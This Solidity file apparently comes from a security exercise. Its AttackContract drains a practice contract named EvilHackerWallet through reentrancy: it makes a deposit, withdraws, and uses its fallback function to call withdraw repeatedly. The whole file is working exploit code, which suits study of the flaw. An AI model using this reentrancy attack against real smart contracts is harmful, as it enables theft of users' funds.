// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import {EvilHackerWallet} from "@src/EvilHackerWallet.sol";

// This contract should NOT have a receive function
contract AttackContract {
    EvilHackerWallet public hackerWallet;
    uint256 public constant AMOUNT = 1 ether;

    address public immutable owner;

    constructor(address _hackerWalletAddress) {
        hackerWallet = EvilHackerWallet(payable(_hackerWalletAddress));
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        hackerWallet.deposit{value: AMOUNT}();
        hackerWallet.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() external {
        require(msg.sender == owner);
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    // Fallback is called when EvilHackerWallet sends Ether to this contract.
    fallback() external payable {
        if (address(hackerWallet).balance >= AMOUNT) {
            hackerWallet.withdraw();
        }
    }
}
